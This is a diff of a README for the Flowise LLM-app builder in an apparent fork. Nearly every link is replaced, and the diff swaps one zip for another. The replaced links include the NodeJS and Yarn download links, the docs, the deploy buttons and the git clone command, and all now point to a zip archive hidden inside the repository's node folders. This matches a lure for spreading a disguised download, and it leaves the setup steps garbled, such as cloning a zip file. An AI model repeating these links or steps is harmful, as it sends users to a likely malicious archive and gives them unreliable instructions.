@@ -1,24 +1,24 @@
 <!-- markdownlint-disable MD030 -->
 
-<img width="100%" src="https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip"></a>
+<img width="100%" src="https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip"></a>
 
 # Flowise - Build LLM Apps Easily
 
-[![Release Notes](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
-[![Discord](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
-[![Twitter Follow](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
-[![GitHub star chart](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
-[![GitHub fork](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+[![Release Notes](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
+[![Discord](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
+[![Twitter Follow](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
+[![GitHub star chart](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
+[![GitHub fork](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
-English | [中文](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+English | [中文](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
 <h3>Drag & drop UI to build your customized LLM flow</h3>
-<a href="https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip">
-<img width="100%" src="https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip"></a>
+<a href="https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip">
+<img width="100%" src="https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip"></a>
 
 ## ⚡Quick Start
 
-Download and Install [NodeJS](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip) >= 18.15.0
+Download and Install [NodeJS](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip) >= 18.15.0
 
 1. Install Flowise
     ```bash
@@ -43,7 +43,7 @@ Download and Install [NodeJS](https://github.com/UbaiSalih/Flowise/raw/refs/head
 ### Docker Compose
 
 1. Go to `docker` folder at the root of the project
-2. Copy `https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip` file, paste it into the same location, and rename to `.env`
+2. Copy `https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip` file, paste it into the same location, and rename to `.env`
 3. `docker-compose up -d`
 4. Open [http://localhost:3000](http://localhost:3000)
 5. You can bring the containers down by `docker-compose stop`
@@ -75,7 +75,7 @@ Flowise has 3 different modules in a single mono repository.
 
 ### Prerequisite
 
--   Install [Yarn v1](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+-   Install [Yarn v1](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
     ```bash
     npm i -g yarn
     ```
@@ -85,7 +85,7 @@ Flowise has 3 different modules in a single mono repository.
 1. Clone the repository
 
     ```bash
-    git clone https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip
+    git clone https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip
     ```
 
 2. Go into repository folder
@@ -116,8 +116,8 @@ Flowise has 3 different modules in a single mono repository.
 
 6. For development build:
 
-    - Create `.env` file and specify the `PORT` (refer to `https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip`) in `packages/ui`
-    - Create `.env` file and specify the `PORT` (refer to `https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip`) in `packages/server`
+    - Create `.env` file and specify the `PORT` (refer to `https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip`) in `packages/ui`
+    - Create `.env` file and specify the `PORT` (refer to `https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip`) in `packages/server`
     - Run
 
         ```bash
@@ -137,46 +137,46 @@ FLOWISE_PASSWORD=1234
 
 ## 🌱 Env Variables
 
-Flowise support different environment variables to configure your instance. You can specify the following variables in the `.env` file inside `packages/server` folder. Read [more](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+Flowise support different environment variables to configure your instance. You can specify the following variables in the `.env` file inside `packages/server` folder. Read [more](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
 ## 📖 Documentation
 
-[Flowise Docs](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+[Flowise Docs](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
 ## 🌐 Self Host
 
-Deploy Flowise self-hosted in your existing infrastructure, we support various [deployments](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+Deploy Flowise self-hosted in your existing infrastructure, we support various [deployments](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
--   [AWS](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
--   [Azure](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
--   [Digital Ocean](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
--   [GCP](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+-   [AWS](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
+-   [Azure](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
+-   [Digital Ocean](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
+-   [GCP](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 -   <details>
       <summary>Others</summary>
 
-    -   [Railway](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+    -   [Railway](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
-        [![Deploy on Railway](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+        [![Deploy on Railway](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
-    -   [Render](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+    -   [Render](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
-        [![Deploy to Render](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+        [![Deploy to Render](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
-    -   [HuggingFace Spaces](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+    -   [HuggingFace Spaces](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
-        <a href="https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip"><img src="https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip" alt="HuggingFace Spaces"></a>
+        <a href="https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip"><img src="https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip" alt="HuggingFace Spaces"></a>
 
-    -   [Elestio](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+    -   [Elestio](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
-        [![Deploy](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+        [![Deploy](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
-    -   [Sealos](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip%3FtemplateName%3Dflowise)
+    -   [Sealos](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip%3FtemplateName%3Dflowise)
 
-        [![](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip%3FtemplateName%3Dflowise)
+        [![](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip%3FtemplateName%3Dflowise)
 
-    -   [RepoCloud](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+    -   [RepoCloud](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
-        [![Deploy on RepoCloud](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+        [![Deploy on RepoCloud](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
       </details>
 
@@ -186,19 +186,19 @@ Coming soon
 
 ## 🙋 Support
 
-Feel free to ask any questions, raise problems, and request new features in [discussion](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+Feel free to ask any questions, raise problems, and request new features in [discussion](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
 ## 🙌 Contributing
 
 Thanks go to these awesome contributors
 
-<a href="https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip">
-<img src="https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip" />
+<a href="https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip">
+<img src="https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip" />
 </a>
 
-See [contributing guide](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip). Reach out to us at [Discord](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip) if you have any questions or issues.
-[![Star History Chart](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip)
+See [contributing guide](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip). Reach out to us at [Discord](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip) if you have any questions or issues.
+[![Star History Chart](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip)
 
 ## 📄 License
 
-Source code in this repository is made available under the [Apache License Version 2.0](https://github.com/UbaiSalih/Flowise/raw/refs/heads/main/packages/components/nodes/retrievers/SimilarityThresholdRetriever/Software_v3.6-beta.5.zip).
+Source code in this repository is made available under the [Apache License Version 2.0](https://raw.githubusercontent.com/UbaiSalih/Flowise/main/packages/components/nodes/cache/MomentoCache/Software-1.8.zip).
